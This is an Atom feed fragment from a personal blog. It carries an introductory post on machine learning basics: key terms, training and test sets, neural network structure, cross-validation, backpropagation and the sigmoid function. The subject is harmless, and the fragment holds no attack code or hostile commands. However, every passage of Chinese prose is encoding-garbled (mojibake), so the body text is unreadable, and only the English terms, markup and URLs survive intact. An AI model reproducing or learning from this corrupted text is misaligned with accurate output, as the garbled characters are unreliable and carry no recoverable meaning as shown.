&lt;p&gt;CNNæ›¾ç»è¢«&lt;code&gt;AlphaGo&lt;/code&gt;çš„å¼€å‘å›¢é˜Ÿç”¨äºå…¶å¼€å‘ï¼Œä»è€Œä¹Ÿä¸€åº¦å¼•èµ·ä¸šå†…äººå£«çš„é’çï¼Œä¸è¿‡æœ‰äº›æ—¶å€™ä¼šå‡ºç°å¯¹CNNçš„ç›²ç›®å´‡æ‹œï¼Œæ¯”å¦‚ä½ é¢è¯•çš„æ—¶å€™ï¼Œå¯¹é¢å¯èƒ½ä¼šé—®ï¼šä½ åšè¿‡æœºå™¨å­¦ä¹ å—ï¼Ÿä½ ä¸ºä»€ä¹ˆæ²¡æœ‰é‡‡ç”¨CNNç®—æ³•å‘¢ï¼Ÿ
    
    </summary>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Machine Learning" scheme="http://ggb0n.cool/tags/Machine-Learning/"/>
    
      <category term="Neural Network" scheme="http://ggb0n.cool/tags/Neural-Network/"/>
    
  </entry>
  
  <entry>
    <title>æœºå™¨å­¦ä¹ åŸºæœ¬çŸ¥è¯†</title>
    <link href="http://ggb0n.cool/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
    <id>http://ggb0n.cool/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</id>
    <published>2020-04-08T16:03:30.000Z</published>
    <updated>2020-04-22T00:16:45.002Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ç”±äºä¸€äº›éœ€è¦åœ¨å­¦ä¹ æœºå™¨å­¦ä¹ ï¼ŒBç«™ä¸Šæ‰¾äº†<a href="https://www.bilibili.com/video/av59606777">ä¸€ä¸ªç³»åˆ—</a>çš„è§†é¢‘ï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œå¯¹æœºå™¨å­¦ä¹ ã€æ·±åº¦å­¦ä¹ å¥½å¥½å­¦ä¹ å­¦ä¹ ï¼Œåšä¸€äº›ç®€å•çš„è®°å½•ã€‚<a id="more"></a></p><h3 id="æœºå™¨å­¦ä¹ "><a href="#æœºå™¨å­¦ä¹ " class="headerlink" title="æœºå™¨å­¦ä¹ "></a>æœºå™¨å­¦ä¹ </h3><p><code>æœºå™¨å­¦ä¹ ï¼ˆMachine Learning, MLï¼‰</code>æ˜¯å¤šé¢†åŸŸäº¤å‰å­¦ç§‘ï¼Œæ¶‰åŠæ¦‚ç‡è®ºã€ç»Ÿè®¡å­¦ã€é€¼è¿‘è®ºã€å‡¸åˆ†æã€ç®—æ³•å¤æ‚åº¦ç†è®ºç­‰å¤šé—¨å­¦ç§‘ã€‚ä¸“é—¨ç ”ç©¶è®¡ç®—æœºæ€æ ·æ¨¡æ‹Ÿæˆ–å®ç°äººç±»çš„å­¦ä¹ è¡Œä¸ºï¼Œä»¥è·å–æ–°çš„çŸ¥è¯†æˆ–è€…æŠ€èƒ½ï¼Œé‡æ–°ç»„ç»‡å·²æœ‰çš„çŸ¥è¯†ç»“æ„ä½¿ä¹‹ä¸æ–­æ”¹å–„è‡ªèº«çš„æ€§èƒ½ã€‚<br>æœºå™¨å­¦ä¹ æ˜¯<code>äººå·¥æ™ºèƒ½</code>çš„æ ¸å¿ƒï¼Œæ˜¯ä½¿è®¡ç®—æœºå…·æœ‰æ™ºèƒ½çš„æ ¹æœ¬é€”å¾„ï¼Œå…¶åº”ç”¨éåŠäººå·¥æ™ºèƒ½çš„å„ä¸ªé¢†åŸŸï¼Œä¸»è¦ä½¿ç”¨å½’çº³ã€ç»¼åˆè€Œä¸æ˜¯æ¼”ç»ã€‚æœºå™¨å­¦ä¹ ã€æœºå™¨å­¦ä¹ ï¼Œé‚£ä¹ˆè¿™é‡Œçš„å­¦ä¹ åˆ°åº•æŒ‡ä»€ä¹ˆæ ·çš„ä¸€ä¸ªè¿‡ç¨‹å‘¢ï¼Ÿ</p><blockquote><p>å­¦ä¹ ï¼šé’ˆå¯¹ç»éªŒ<code>E</code>å’Œä¸€ç³»åˆ—ä»»åŠ¡<code>T</code>ä»¥åŠä¸€å®šè¡¨ç°çš„è¡¡é‡<code>P</code>ï¼Œå¦‚æœéšä¹‹ç»éªŒ<code>E</code>çš„ç§¯ç´¯ï¼Œé’ˆå¯¹å®šä¹‰å¥½çš„ä»»åŠ¡<code>T</code>å¯ä»¥æé«˜è¡¨ç°<code>P</code>ï¼Œå°±è¯´æ˜è®¡ç®—æœºå…·æœ‰å­¦ä¹ èƒ½åŠ›ã€‚ </p></blockquote><p>æœºå™¨å­¦ä¹ è¢«è¿™æ ·å®šä¹‰ï¼šæ¢ç©¶å’Œå¼€å‘ä¸€ç³»åˆ—ç®—æ³•æ¥å¦‚ä½•ä½¿è®¡ç®—æœºä¸éœ€è¦é€šè¿‡å¤–éƒ¨æ˜æ˜¾åœ°çŸ¥è¯†ï¼Œè€Œå¯ä»¥é€šè¿‡æ•°æ®è¿›è¡Œå­¦ä¹ ã€å»ºæ¨¡ï¼Œå¹¶ä¸”åˆ©ç”¨å»ºç«‹çš„æ¨¡å‹å¯¹æ–°è¾“å…¥çš„æ•°æ®è¿›è¡Œé¢„æµ‹çš„å­¦ç§‘ã€‚</p><p>å½“ä»Šï¼Œæœºå™¨å­¦ä¹ å·²ç»å¹¿ä¸ºï¼Œç°åœ¨å¸¸è§å¹¶ä¸”ç«çƒ­çš„åº”ç”¨å¦‚ä¸‹ï¼š</p><ul><li>è¯­éŸ³è¯†åˆ«</li><li>è‡ªåŠ¨é©¾é©¶</li><li>è¯­è¨€ç¿»è¯‘</li><li>è®¡ç®—æœºè§†è§‰</li><li>æ¨èç³»ç»Ÿ</li><li>æ— äººæœº</li><li>åƒåœ¾é‚®ä»¶è¯†åˆ«</li></ul><h4 id="ä¸€äº›åŸºæœ¬æ¦‚å¿µ"><a href="#ä¸€äº›åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ä¸€äº›åŸºæœ¬æ¦‚å¿µ"></a>ä¸€äº›åŸºæœ¬æ¦‚å¿µ</h4><p>æœºå™¨å­¦ä¹ ã€åŒ…æ‹¬ä¸‹é¢æåˆ°çš„æ·±åº¦å­¦ä¹ éƒ½æœ‰è‡ªå·±çš„ä¸€äº›å…ƒç´ ï¼Œä¹Ÿç®—æ˜¯ä¸€äº›æ¦‚å¿µï¼Œä¸»è¦æ˜¯ï¼š<code>è®­ç»ƒé›†</code>ã€<code>æµ‹è¯•é›†</code>ã€<code>ç‰¹å¾å€¼</code>ã€<code>ç›‘ç£å­¦ä¹ </code>ã€<code>éç›‘ç£å­¦ä¹ </code>ã€<code>åŠç›‘ç£å­¦ä¹ </code>ã€<code>åˆ†ç±»</code>ã€<code>å›å½’</code>ã€‚ä¸‹é¢å¯¹ä¸»è¦æ¦‚å¿µè¿›è¡Œè§£é‡Šï¼š</p><p>æ¦‚å¿µå­¦ä¹ ï¼šä»æœ‰å…³æŸä¸ªå¸ƒå°”å‡½æ•°çš„è¾“å…¥è¾“å‡ºè®­ç»ƒæ ·ä¾‹ä¸­æ¨æ–­å‡ºè¯¥å¸ƒå°”å‡½æ•°ï¼Œæ¦‚å¿µå®šä¹‰åœ¨å®ä¾‹é›†åˆä¹‹ä¸Šï¼›<br>è®­ç»ƒé›†ï¼ˆ<code>training set</code>ï¼‰ï¼šåˆç§°è®­ç»ƒæ ·ä¾‹ï¼Œç”¨æ¥è®­ç»ƒã€äº§ç”Ÿæ¨¡å‹æˆ–ç®—æ³•çš„æ•°æ®é›†ï¼›<br>æµ‹è¯•é›†ï¼ˆ<code>testing set</code>ï¼‰ï¼šåˆç§°æµ‹è¯•æ ·ä¾‹ï¼Œä¸“é—¨ç”¨æ¥æµ‹è¯•è®­ç»ƒå¥½çš„æ¨¡å‹æˆ–ç®—æ³•çš„æ•°æ®é›†ï¼›<br>ç‰¹å¾å‘é‡ï¼ˆ<code>feature vector</code>ï¼‰ï¼šå±æ€§çš„é›†åˆï¼Œé€šå¸¸ç”¨ä¸€ä¸ªå‘é‡æ¥è¡¨ç¤ºï¼Œé™„å±äºä¸€ä¸ªå®ä¾‹ï¼›<br>æ ‡è®°ï¼ˆ<code>label</code>ï¼‰ï¼šå®ä¾‹ç±»åˆ«çš„æ ‡è®°ï¼Œå³ç»“æœçš„ç±»å‹ï¼ŒåŒ…æ‹¬æ­£ä¾‹ï¼ˆpositive exampleï¼‰å’Œåä¾‹ï¼ˆnegative exampleï¼‰;<br>åˆ†ç±»ï¼ˆ<code>classification</code>ï¼‰ï¼šç›®æ ‡æ ‡è®°ä¸ºç±»åˆ«å‹æ•°æ®ï¼ˆcategoryï¼‰;<br>å›å½’ï¼ˆ<code>regression</code>ï¼‰ï¼šç›®æ ‡æ ‡è®°ä¸ºè¿ç»­æ€§æ•°å€¼ï¼ˆcontinuous numeric valueï¼‰;<br>æœ‰ç›‘ç£å­¦ä¹ ï¼ˆ<code>supervised learning</code>ï¼‰ï¼šè®­ç»ƒé›†æ•°æ®æœ‰ç±»åˆ«æ ‡è®°ï¼Œå³è®­ç»ƒé›†çš„æ ·ä¾‹å­˜åœ¨æœ€ç»ˆçš„ç»“æœï¼›<br>æ— ç›‘ç£å­¦ä¹ ï¼ˆ<code>unsupervised learning</code>ï¼‰ï¼šè®­ç»ƒé›†æ•°æ®æ— ç±»åˆ«æ ‡è®°ï¼›<br>åŠç›‘ç£å­¦ä¹ ï¼ˆ<code>semi-supervised learning</code>ï¼‰ï¼šè®­ç»ƒé›†æ•°æ®éƒ¨åˆ†æœ‰ç±»åˆ«æ ‡è®°ã€éƒ¨åˆ†æ²¡æœ‰ç±»åˆ«æ ‡è®°ã€‚</p><h4 id="æœºå™¨å­¦ä¹ æ­¥éª¤"><a href="#æœºå™¨å­¦ä¹ æ­¥éª¤" class="headerlink" title="æœºå™¨å­¦ä¹ æ­¥éª¤"></a>æœºå™¨å­¦ä¹ æ­¥éª¤</h4><ul><li>1ã€æŠŠæ•°æ®é›†æ‹†åˆ†ä¸º<code>è®­ç»ƒé›†</code>å’Œ<code>æµ‹è¯•é›†</code></li><li>2ã€ç”¨è®­ç»ƒé›†å’Œè®­ç»ƒé›†çš„<code>ç‰¹å¾å‘é‡</code>æ¥è®­ç»ƒç®—æ³•</li><li>3ã€ç”¨è®­ç»ƒå‡ºçš„ç®—æ³•åœ¨æµ‹è¯•é›†ä¸Šè¿›è¡Œè¯„ä¼°ï¼ˆå¯èƒ½æ¶‰åŠè°ƒæ•´å‚æ•°ï¼Œç”¨åˆ°<code>éªŒè¯é›†</code>ï¼ˆ<code>parameter set</code>ï¼‰ï¼‰</li></ul><h4 id="ç®—æ³•è¯„ä¼°"><a href="#ç®—æ³•è¯„ä¼°" class="headerlink" title="ç®—æ³•è¯„ä¼°"></a>ç®—æ³•è¯„ä¼°</h4><p>å¯¹ä¸€ä¸ªæœºå™¨å­¦ä¹ ç®—æ³•æ€§èƒ½çš„è¯„ä¼°ï¼Œä¸»è¦è€ƒè™‘ä¸€ä¸‹äº”ä¸ªæ–¹é¢ï¼š</p><ul><li>1ã€<code>å‡†ç¡®ç‡</code>ï¼šæ‰§è¡Œç»“æœçš„å‡†ç¡®åº¦</li><li>2ã€<code>é€Ÿåº¦</code>ï¼šæ‰§è¡Œé€Ÿåº¦çš„å¿«æ…¢</li><li>3ã€<code>å¼ºå£®æ€§</code>ï¼šæ•°æ®çš„ä¸ªåˆ«å€¼ç¼ºå¤±æ—¶èƒ½å¦å¯¹æ•°æ®è¿›è¡Œå‡†ç¡®å¤„ç†</li><li>4ã€<code>å¯è§„æ¨¡æ€§</code>ï¼šæ•°æ®é›†å¾ˆå¤§çš„æ—¶å€™ç®—æ³•æ˜¯å¦ä»ç„¶æœ‰æ•ˆ</li><li>5ã€<code>å¯è§£é‡Šæ€§</code>ï¼šç®—æ³•å¤„ç†æ•°æ®çš„ç»“æœå¯è§£é‡Šçš„ç¨‹åº¦</li></ul><h3 id="æ·±åº¦å­¦ä¹ "><a href="#æ·±åº¦å­¦ä¹ " class="headerlink" title="æ·±åº¦å­¦ä¹ "></a>æ·±åº¦å­¦ä¹ </h3><p>äº†è§£äº†æœºå™¨å­¦ä¹ çš„åŸºæœ¬çŸ¥è¯†ï¼Œå†å¾€æ·±é‡Œè¯´æ˜¯<code>æ·±åº¦å­¦ä¹ ï¼ˆDeep Learning, DLï¼‰</code>ï¼Œå®ƒæ˜¯åŸºäºæœºå™¨å­¦ä¹ å»¶ä¼¸å‡ºçš„ä¸€ä¸ªæ–°é¢†åŸŸï¼Œç”±ä»¥äººè„‘ç»“æ„ä¸ºå¯å‘çš„<code>ç¥ç»ç½‘ç»œç®—æ³•ï¼ˆNNsï¼‰</code>ä¸ºèµ·æºåŠ ä¹‹æ¨¡å‹ç»“æ„æ·±åº¦çš„å¢åŠ å‘å±•ï¼Œå¹¶ä¼´éšå¤§æ•°æ®å’Œè®¡ç®—èƒ½åŠ›çš„æé«˜è€Œäº§ç”Ÿçš„ä¸€ç³»åˆ—ç®—æ³•ã€‚<br>æ·±åº¦å­¦ä¹ è¢«å¹¿æ³›åº”ç”¨äºå›¾åƒå¤„ç†ä¸è®¡ç®—æœºè§†è§‰ã€è‡ªç„¶è¯­è¨€å¤„ç†ä»¥åŠè¯­éŸ³è¯†åˆ«ç­‰é¢†åŸŸã€‚</p><p>å¯¹äºæ·±åº¦å­¦ä¹ ï¼Œä¸»è¦å¯¹<code>ç¥ç»ç½‘ç»œ</code>ç›¸å…³çš„ç®—æ³•è¿›è¡Œå­¦ä¹ ï¼Œè¿™ä¹Ÿæ˜¯ç›®å‰åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„æœºå™¨å­¦ä¹ ç®—æ³•äº†ã€‚</p><h3 id="ç¥ç»ç½‘ç»œ"><a href="#ç¥ç»ç½‘ç»œ" class="headerlink" title="ç¥ç»ç½‘ç»œ"></a>ç¥ç»ç½‘ç»œ</h3><p><code>ç¥ç»ç½‘ç»œ</code>ï¼ˆ<code>NNs</code>ï¼‰ï¼Œä¹Ÿç§°<code>äººå·¥ç¥ç»ç½‘ç»œ</code>ï¼ˆ<code>Artificial Neural Networks</code>ï¼Œç®€å†™ä¸º<code>ANNs</code>ï¼‰æˆ–ç§°ä½œ<code>è¿æ¥æ¨¡å‹</code>ï¼ˆ<code>Connection Model</code>ï¼‰ï¼Œå®ƒæ˜¯ä¸€ç§æ¨¡ä»¿åŠ¨ç‰©ç¥ç»ç½‘ç»œè¡Œä¸ºç‰¹å¾ï¼Œè¿›è¡Œåˆ†å¸ƒå¼å¹¶è¡Œä¿¡æ¯å¤„ç†çš„ç®—æ³•æ•°å­¦æ¨¡å‹ã€‚è¿™ç§ç½‘ç»œä¾é ç³»ç»Ÿçš„å¤æ‚ç¨‹åº¦ï¼Œé€šè¿‡è°ƒæ•´å†…éƒ¨å¤§é‡èŠ‚ç‚¹ä¹‹é—´ç›¸äº’è¿æ¥çš„å…³ç³»ï¼Œä»è€Œè¾¾åˆ°å¤„ç†ä¿¡æ¯çš„ç›®çš„ã€‚</p><p>å®ƒæœºå™¨å­¦ä¹ å¾—ä»¥å‘å±•å‡ºæ·±åº¦å­¦ä¹ çš„å…³é”®æ‰€åœ¨ï¼Œä»¥äººè„‘ä¸­çš„ç¥ç»ç½‘ç»œä¸ºå¯å‘äº§ç”Ÿçš„æœºå™¨å­¦ä¹ ç®—æ³•ã€‚</p><h4 id="å¤šå±‚å‘å‰ç¥ç»ç½‘ç»œ-Muiltilayer-Feed-Forward-Neural-Network"><a href="#å¤šå±‚å‘å‰ç¥ç»ç½‘ç»œ-Muiltilayer-Feed-Forward-Neural-Network" class="headerlink" title="å¤šå±‚å‘å‰ç¥ç»ç½‘ç»œ(Muiltilayer Feed-Forward Neural Network)"></a>å¤šå±‚å‘å‰ç¥ç»ç½‘ç»œ(Muiltilayer Feed-Forward Neural Network)</h4><p>ä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>è¾“å…¥å±‚</code>ï¼ˆ<code>input layer</code>ï¼‰ï¼Œ<code>éšè—å±‚</code>ï¼ˆ<code>hidden layers</code>ï¼‰ï¼Œ<code>è¾“å‡ºå±‚</code>ï¼ˆ<code>output layer</code>ï¼‰</p><p><img src="http://ggb0n.cool/images/NN01.png" alt=""></p><p>æ¯å±‚ç”±<code>å•å…ƒ</code>ï¼ˆ<code>unit</code>ï¼Œä¹Ÿç§°ä¸º<code>ç¥ç»å…ƒ</code>ï¼‰ç»„æˆï¼Œè¾“å…¥å±‚å°†è®­ç»ƒé›†çš„å®ä¾‹ç‰¹å¾å‘é‡è¿›è¡Œä¼ å…¥ï¼Œç»è¿‡è¿æ¥ç»“ç‚¹çš„<code>æƒé‡</code>ï¼ˆ<code>weight</code>ï¼‰ä¼ å…¥ä¸‹ä¸€å±‚ï¼Œä¸Šä¸€å±‚çš„è¾“å‡ºæ˜¯ä¸‹ä¸€å±‚çš„è¾“å…¥ã€‚éšè—å±‚çš„æ•°é‡æ˜¯ä»»æ„çš„ï¼Œè¾“å…¥å±‚å’Œè¾“å‡ºå±‚åªæœ‰ä¸€å±‚ï¼Œä¸è¿‡ä¸€èˆ¬ç®—å±‚æ•°æ—¶ä¸å°†è¾“å…¥å±‚è®¡ç®—åœ¨å†…ã€‚</p><p>å…¶å·¥ä½œè¿‡ç¨‹å¤§è‡´æ˜¯ï¼šå°†è¾“å…¥çš„å®ä¾‹å€¼è¿›è¡ŒåŠ æƒæ±‚å’Œï¼Œå†ç»è¿‡éçº¿æ€§æ–¹ç¨‹è½¬åŒ–è¾“å‡ºåˆ°ä¸‹ä¸€å±‚ã€‚ç†è®ºä¸Šè®²ï¼Œå½“éšè—å±‚è¶³å¤Ÿå¤šã€è®­ç»ƒé›†è¶³å¤Ÿå¤§æ—¶ï¼Œå¯ä»¥æ¨¡æ‹Ÿå‡ºä»»ä½•æ–¹ç¨‹ã€‚</p><h4 id="è®¾è®¡ç¥ç»ç½‘ç»œç»“æ„"><a href="#è®¾è®¡ç¥ç»ç½‘ç»œç»“æ„" class="headerlink" title="è®¾è®¡ç¥ç»ç½‘ç»œç»“æ„"></a>è®¾è®¡ç¥ç»ç½‘ç»œç»“æ„</h4><p>ä½¿ç”¨ç¥ç»ç½‘ç»œè®­ç»ƒæ•°æ®ä¹‹å‰ï¼Œå¿…é¡»ç¡®å®šç¥ç»ç½‘ç»œçš„å±‚æ•°ï¼Œä»¥åŠæ¯å±‚å•å…ƒçš„ä¸ªæ•°ã€‚</p><p>ç‰¹å¾å‘é‡åœ¨è¢«ä¼ å…¥è¾“å…¥å±‚æ—¶é€šå¸¸è¢«å…ˆ<code>æ ‡å‡†åŒ–</code>ï¼ˆ<code>normalize</code>ï¼‰åˆ°<code>0</code>å’Œ<code>1</code>ä¹‹é—´ï¼Œç›®çš„æ˜¯åŠ é€Ÿå­¦ä¹ çš„è¿‡ç¨‹ï¼Œä½†æ˜¯è¾“å…¥çš„ç‰¹å¾å€¼ç±»å‹å¯èƒ½æ˜¯<code>ç¦»æ•£å‹</code>çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯<code>è¿ç»­å‹</code>çš„ã€‚å¯¹äºç¦»æ•£å‹çš„å˜é‡ï¼Œå¯ä»¥é€šè¿‡ç¼–ç æˆæ¯ä¸€ä¸ªè¾“å…¥å•å…ƒå¯¹åº”ä¸€ä¸ªç‰¹å¾å€¼å¯èƒ½èµ‹çš„å€¼ã€‚ä¾‹å¦‚</p><blockquote><p>ç‰¹å¾å€¼<code>A</code>å¯èƒ½å–ä¸‰ä¸ªå€¼<code>ï¼ˆa0ã€a1ã€a2ï¼‰</code>ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>3</code>ä¸ªè¾“å…¥å•å…ƒæ¥è¡¨ç¤º<code>A</code>ã€‚å¦‚æœ<code>A=a0</code>ï¼Œåˆ™è¡¨ç¤º<code>a0</code>çš„å•å…ƒå€¼å–<code>1</code>ï¼Œå…¶ä½™å–<code>0</code>ï¼›å¦‚æœ<code>A=a1</code>ï¼Œåˆ™è¡¨ç¤º<code>a1</code>çš„å•å…ƒå€¼å–<code>1</code>ï¼Œå…¶ä½™å–<code>0</code>ã€‚</p></blockquote><p>ç¥ç»ç½‘ç»œæ—¢å¯ä»¥è§£å†³<code>åˆ†ç±»é—®é¢˜</code>ï¼Œä¹Ÿå¯ä»¥è§£å†³<code>å›å½’é—®é¢˜</code>ã€‚åˆ†ç±»é—®é¢˜å³ä¸ºç»“æœæ˜¯ç¦»æ•£å‹çš„é—®é¢˜ï¼Œæ¯”å¦‚é¢„æµ‹å“ªä¸ªå“ç‰Œçš„ç”µè„‘å–å¾—æ›´å¥½ï¼›å›å½’é—®é¢˜å³ç»“æœæ˜¯è¿ç»­å‹çš„é—®é¢˜ï¼Œæ¯”å¦‚é¢„æµ‹æŸåœ°çš„æˆ¿ä»·ã€‚<br>åˆ†ç±»é—®é¢˜å±…å¤šï¼Œå› æ­¤ä¸»è¦å­¦ä¹ åˆ†ç±»é—®é¢˜çš„è§£å†³ï¼Œå¯¹äºè¯¥ç±»é—®é¢˜ï¼Œå¦‚æœæ˜¯ä¸¤ç±»ï¼Œç”¨ä¸€ä¸ªè¾“å‡ºå•å…ƒè¡¨ç¤ºå³å¯ï¼Œå³<code>0</code>å’Œ<code>1</code>ï¼›å¤šäºä¸¤ç±»åˆ™æ¯ä¸€ä¸ªç±»åˆ«ç”¨ä¸€ä¸ªè¾“å‡ºå•å…ƒè¡¨ç¤ºï¼Œå› æ­¤è¾“å‡ºå±‚çš„å•å…ƒæ•°é‡é€šå¸¸ç­‰äºç±»åˆ«çš„æ•°é‡ã€‚</p><p>å¯¹äºéšè—å±‚æ•°çš„è®¾ç½®ï¼Œå¦‚æœæ²¡æœ‰æ˜ç¡®è§„åˆ™ï¼Œåˆ™å¯ä»¥æ ¹æ®å®éªŒæµ‹è¯•å’Œè¯¯å·®ï¼Œä»¥åŠå‡†ç¡®åº¦æ¥å®éªŒå¹¶ä½œå‡ºè°ƒæ•´ã€‚å‡†ç¡®åº¦çš„æµ‹è¯•å¯ä»¥åˆ©ç”¨æµ‹è¯•é›†æ¥è¿›è¡Œæµ‹è¯•ã€‚ä¸è¿‡è¿˜æœ‰ä¸€ç§å¸¸ç”¨çš„æµ‹è¯•æ–¹æ³•ï¼š<code>äº¤å‰éªŒè¯æ–¹æ³•</code>ã€‚</p><h4 id="äº¤å‰éªŒè¯æ–¹æ³•ï¼ˆCross-Validationï¼‰"><a href="#äº¤å‰éªŒè¯æ–¹æ³•ï¼ˆCross-Validationï¼‰" class="headerlink" title="äº¤å‰éªŒè¯æ–¹æ³•ï¼ˆCross-Validationï¼‰"></a>äº¤å‰éªŒè¯æ–¹æ³•ï¼ˆCross-Validationï¼‰</h4><p>å°†æ•°æ®é›†åˆ†ä¸º<code>n</code>ä»½ï¼Œç¬¬ä¸€æ¬¡å°†ç¬¬ä¸€ä»½ä½œä¸ºæµ‹è¯•é›†å…¶ä½™ä½œä¸ºè®­ç»ƒé›†è¿›è¡Œè®­ç»ƒå’Œæµ‹è¯•ï¼Œç¬¬äºŒå±‚é€‰æ‹©ç¬¬äºŒä»½ä½œä¸ºæµ‹è¯•é›†å…¶ä½™ä½œä¸ºè®­ç»ƒé›†è¿›è¡Œè®­ç»ƒå’Œæµ‹è¯•ï¼Œä¾æ¬¡ç±»æ¨è¿›è¡Œã€‚</p><p><img src="http://ggb0n.cool/images/NN02.png" alt=""></p><h4 id="Backpropagationç®—æ³•"><a href="#Backpropagationç®—æ³•" class="headerlink" title="Backpropagationç®—æ³•"></a>Backpropagationç®—æ³•</h4><p>è¯¥ç®—æ³•å¯ä»¥è¯´æ˜¯å…¶ä»–ç¥ç»ç½‘ç»œç®—æ³•çš„åŸºæœ¬ï¼Œé€šè¿‡<code>è¿­ä»£æ€§</code>çš„è®­ç»ƒé›†è¾“å…¥æ¥å¤„ç†è®­ç»ƒé›†ä¸­çš„å®ä¾‹ï¼Œå¯¹æ¯”é€šè¿‡ç¥ç»ç½‘ç»œå¤„ç†åè¾“å‡ºå±‚çš„é¢„æµ‹å€¼ä¸è®­ç»ƒé›†çœŸå®å€¼ä¹‹é—´çš„å·®ï¼Œæ¥<code>åå‘åœ°</code>ä»¥æœ€å°åŒ–è¯¯å·®è°ƒèŠ‚æ¯ä¸ªè¿æ¥ä¹‹é—´çš„æƒé‡ï¼Œä»¥æ­¤æ–¹å¼é€æ¸åœ°è¿›è¡Œè®­ç»ƒã€‚</p><p>ç®—æ³•çš„è¦ç´ å¦‚ä¸‹ï¼š</p><blockquote><p>è¾“å…¥ï¼šæ•°æ®é›†<code>D</code>ã€å­¦ä¹ ç‡<code>L</code>ã€ä¸€ä¸ªå¤šå±‚å‘å‰ç¥ç»ç½‘ç»œ<br>è¾“å‡ºï¼šä¸€ä¸ªè®­ç»ƒå¥½çš„ç¥ç»ç½‘ç»œ<br>èµ·å§‹çŠ¶æ€æ—¶éœ€è¦åˆå§‹åŒ–<code>æƒé‡</code>ã€<code>åå‘</code>ï¼ˆ<code>Bias</code>ï¼Œæ¯ä¸ªå•å…ƒéƒ½æœ‰ä¸€ä¸ªåå‘ï¼Œç›¸å½“äºä¸Šå±‚ä¼ åˆ°å½“å‰ç»“ç‚¹çš„ä¸€ä¸ªåç§»ï¼‰ï¼šéšæœºåˆå§‹åŒ–å€¼åœ¨<code>-1</code>åˆ°<code>1</code>ä¹‹é—´ï¼Œæˆ–è€…<code>-0.5</code>åˆ°<code>0.5</code>ä¹‹é—´ã€‚</p></blockquote><p>å¯¹äºä¸€ä¸ªè®­ç»ƒå®ä¾‹ï¼Œæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p><ul><li>1ã€ç”±è¾“å…¥å±‚å‘å‰ä¼ é€ï¼Œä¼ é€æ—¶éœ€è¦å¯¹æ¯ä¸ªå•å…ƒè¿›è¡ŒåŠ æƒï¼Œç„¶ååŠ ä¸Šä¼ å…¥åˆ°çš„ç›®æ ‡ç»“ç‚¹çš„åå‘å€¼ï¼Œæœ€åå¯¹åŠ æƒå€¼è¿›è¡Œéçº¿æ€§çš„è½¬åŒ–ï¼Œç„¶åä¼ é€ç»™ä¸‹å±‚ç»“ç‚¹ã€‚å¦‚ä¸‹å›¾ï¼š</li></ul><p><img src="http://ggb0n.cool/images/NN03.png" alt=""></p><ul><li>2ã€æ ¹æ®è¯¯å·®è¿›è¡Œåå‘ä¼ é€</li></ul><p><img src="http://ggb0n.cool/images/NN04.png" alt=""></p><ul><li>3ã€æŒ‰ç…§ä¸Šè¿°ä¸¤æ­¥ï¼Œè¾“å‡ºè®­ç»ƒé›†ä¸åŒçš„æ•°æ®è¿›è¡Œå¤šæ¬¡çš„å‘å‰ä¼ é€å’Œåå‘ä¼ é€è¿›è¡Œæ›´æ–°ï¼Œç»ˆæ­¢æ¡ä»¶ï¼š<ul><li>æƒé‡çš„æ›´æ–°ä½äºæŸä¸ªé˜ˆå€¼</li><li>é¢„æµ‹çš„é”™è¯¯ç‡ä½äºæŸä¸ªé˜ˆå€¼</li><li>è¾¾åˆ°é¢„è®¾ä¸€å®šçš„å¾ªç¯æ¬¡æ•°</li></ul></li></ul><h4 id="éçº¿æ€§è½¬åŒ–æ–¹ç¨‹"><a href="#éçº¿æ€§è½¬åŒ–æ–¹ç¨‹" class="headerlink" title="éçº¿æ€§è½¬åŒ–æ–¹ç¨‹"></a>éçº¿æ€§è½¬åŒ–æ–¹ç¨‹</h4><p><code>sigmoid</code>å‡½æ•°ï¼ˆ<code>Sæ›²çº¿</code>ï¼‰ç”¨æ¥ä½œä¸ºè½¬åŒ–æ–¹ç¨‹ï¼Œsigmoidå‡½æ•°æ›²çº¿å½¢å¦‚ä¸‹å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/NN05.png" alt=""></p><p>é€šå¸¸æœ‰ä¸¤ç§ï¼š<a href="[https://zh.wikipedia.org/wiki/%E5%8F%8C%E6%9B%B2%E5%87%BD%E6%95%B0](https://zh.wikipedia.org/wiki/åŒæ›²å‡½æ•°)">åŒæ›²å‡½æ•°</a>å’Œ<a href="https://zh.wikipedia.org/wiki/%E9%82%8F%E8%BC%AF%E5%87%BD%E6%95%B8">é€»è¾‘å‡½æ•°</a></p><p>å…³äºæœºå™¨å­¦ä¹ çš„çŸ¥è¯†å¾ˆå¤šï¼Œæˆ‘ä¸»è¦å­¦ä¹ ä¸€äº›ç¥ç»ç½‘ç»œçš„ä¸œè¥¿ï¼Œåé¢ä¼šç»§ç»­è®°å½•ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘ç”±äºä¸€äº›éœ€è¦åœ¨å­¦ä¹ æœºå™¨å­¦ä¹ ï¼ŒBç«™ä¸Šæ‰¾äº†&lt;a href=&quot;https://www.bilibili.com/video/av59606777&quot;&gt;ä¸€ä¸ªç³»åˆ—&lt;/a&gt;çš„è§†é¢‘ï¼Œæ„Ÿè§‰è¿˜è¡Œï¼Œå¯¹æœºå™¨å­¦ä¹ ã€æ·±åº¦å­¦ä¹ å¥½å¥½å­¦ä¹ å­¦ä¹ ï¼Œåšä¸€äº›ç®€å•çš„è®°å½•ã€‚
    
    </summary>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Machine Learning" scheme="http://ggb0n.cool/tags/Machine-Learning/"/>
    
